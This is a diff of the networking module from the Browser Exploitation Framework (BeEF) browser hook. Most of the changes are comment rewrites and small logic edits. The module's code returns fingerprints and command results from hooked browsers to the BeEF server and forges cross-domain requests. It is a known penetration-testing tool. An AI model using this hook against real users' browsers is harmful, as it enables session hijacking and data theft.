@@ -1,35 +1,37 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2012 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 /*!
  * @literal object: beef.net
  *
- * Provides basic networking functions.
+ * Provides basic networking functions,
+ * like beef.net.request and beef.net.forgeRequest,
+ * used by BeEF command modules and the Requester extension,
+ * as well as beef.net.send which is used to return commands
+ * to BeEF server-side components.
+ *
+ * Also, it contains the core methods used by the XHR-polling
+ * mechanism (flush, queue)
  */
 beef.net = {
 
     host:"<%= @beef_host %>",
     port:"<%= @beef_port %>",
     hook:"<%= @beef_hook %>",
+    httpproto:"<%= @beef_proto %>",
     handler:'/dh',
     chop:500,
     pad:30, //this is the amount of padding for extra params such as pc, pid and sid
     sid_count:0,
     cmd_queue:[],
 
-    //Command object
+    /**
+     * Command object. This represents the data to be sent back to BeEF,
+     * using the beef.net.send() method.
+     */
     command:function () {
         this.cid = null;
         this.results = null;
@@ -37,13 +39,17 @@ beef.net = {
         this.callback = null;
     },
 
-    //Packet object
+    /**
+     * Packet object. A single chunk of data. X packets -> 1 stream
+     */
     packet:function () {
         this.id = null;
         this.data = null;
     },
 
-    //Stream object
+    /**
+     * Stream object. Contains X packets, which are command result chunks.
+     */
     stream:function () {
         this.id = null;
         this.packets = [];
@@ -59,7 +65,8 @@ beef.net = {
 
     /**
      * Response Object - used in the beef.net.request callback
-     * Note: as we are using async mode, the response object will be empty if returned.Using sync mode, request obj fields will be populated.
+     * NOTE: as we are using async mode, the response object will be empty if returned.
+     * Using sync mode, request obj fields will be populated.
      */
     response:function () {
         this.status_code = null;        // 500, 404, 200, 302
@@ -72,7 +79,13 @@ beef.net = {
         this.headers = null;            // full response headers
     },
 
-    //Queues the command, to be sent back to the framework on the next refresh
+    /**
+     * Queues the specified command results.
+     * @param: {String} handler: the server-side handler that will be called
+     * @param: {Integer} cid: command id
+     * @param: {String} results: the data to send
+     * @param: {Function} callback: the function to call after execution
+     */
     queue:function (handler, cid, results, callback) {
         if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
             var s = new beef.net.command();
@@ -84,26 +97,40 @@ beef.net = {
         }
     },
 
-    //Queues the current command and flushes the queue straight away
+    /**
+     * Queues the current command results and flushes the queue straight away.
+     * NOTE: Always send Browser Fingerprinting results
+     * (beef.net.browser_details(); -> /init handler) using normal XHR-polling,
+     * even if WebSockets are enabled.
+     * @param: {String} handler: the server-side handler that will be called
+     * @param: {Integer} cid: command id
+     * @param: {String} results: the data to send
+     * @param: {Function} callback: the function to call after execution
+     */
     send:function (handler, cid, results, callback) {
-        if (typeof beef.websocket === "undefined") {
+        if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
             this.queue(handler, cid, results, callback);
             this.flush();
-        }
-        else {
+        }else {
             try {
                 beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
                     '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
                     '","callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
-            }
-            catch (e) {
+            }catch (e) {
                 this.queue(handler, cid, results, callback);
                 this.flush();
-                }
+            }
         }
     },
 
-    //Flush all currently queued commands to the framework
+    /**
+     * Flush all currently queued command results to the framework,
+     * chopping the data in chunks ('chunk' method) which will be re-assembled
+     * server-side by the network stack.
+     * NOTE: currently 'flush' is used only with the default
+     * XHR-polling mechanism. If WebSockets are used, the data is sent
+     * back to BeEF straight away.
+     */
     flush:function () {
         if (this.cmd_queue.length > 0) {
             var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
@@ -127,22 +154,30 @@ beef.net = {
         }
     },
 
-    //Split string into chunk lengths determined by amount
+    /**
+     * Split the input data into chunk lengths determined by the amount parameter.
+     * @param: {String} str: the input data
+     * @param: {Integer} amount: chunk length
+     */
     chunk:function (str, amount) {
         if (typeof amount == 'undefined') n = 2;
         return str.match(RegExp('.{1,' + amount + '}', 'g'));
     },
 
-    //Push packets to framework
+    /**
+     * Push the input stream back to the BeEF server-side components.
+     * It uses beef.net.request to send back the data.
+     * @param: {Object} stream: the stream object to be sent back.
+     */
     push:function (stream) {
         //need to implement wait feature here eventually
         for (var i = 0; i < stream.pc; i++) {
-            this.request(this.port == '443' ? 'https' : 'http', 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
+            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
         }
     },
 
     /**
-     *Performs http requests
+     * Performs http requests
      * @param: {String} scheme: HTTP or HTTPS
      * @param: {String} method: GET or POST
      * @param: {String} domain: bindshell.net, 192.168.3.4, etc
@@ -201,13 +236,12 @@ beef.net = {
             data:data,
             timeout:(timeout * 1000),
 
-            //needed otherwise jQuery always add Content-type: application/xml, even if data is populated
+            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
             beforeSend:function (xhr) {
                 if (method == "POST") {
                     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                 }
             },
-
             success:function (data, textStatus, xhr) {
                 var end_time = new Date().getTime();
                 response.status_code = xhr.status;
@@ -248,9 +282,11 @@ beef.net = {
     },
 
     /*
-     * Similar to this.request, except from a few things that are needed when dealing with forged requests:
+     * Similar to beef.net.request, except from a few things that are needed when dealing with forged requests:
      *  - requestid: needed on the callback
      *  - allowCrossDomain: set cross-domain requests as allowed or blocked
+     *
+     * forge_request is used mainly by the Requester and Tunneling Proxy Extensions.
      */
     forge_request:function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {
 
@@ -293,14 +329,21 @@ beef.net = {
             return response;
         }
 
-        // build and execute the request
-        if (method == "POST") {
+        /*
+         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
+         * This will turn POSTs into GETs for remote-domain requests.
+         */
+        if (method == "POST"){
             $j.ajaxSetup({
-                data:data
+                dataType: dataType
+            });
+        } else {
+            $j.ajaxSetup({
+                dataType: 'script'
             });
         }
 
-		// this is required for bugs in IE so data can be transfered back to the server
+		// this is required for bugs in IE so data can be transferred back to the server
         if ( beef.browser.isIE() ) {
             dataType = 'script'
         }
@@ -311,9 +354,7 @@ beef.net = {
             headers: headers,
             timeout: (timeout * 1000),
 
-            // needed otherwise jQuery always adds:
-            // Content-type: application/xml
-            // even if data is populated
+            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
             beforeSend:function (xhr) {
                 if (method == "POST") {
                     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
@@ -415,7 +456,9 @@ beef.net = {
         return false;
     },
 
-    //Sends back browser details to framework
+    /**
+     * Sends back browser details to framework, calling beef.browser.getDetails()
+     */
     browser_details:function () {
         var details = beef.browser.getDetails();
         details['HookSessionID'] = beef.session.get_hook_session_id();
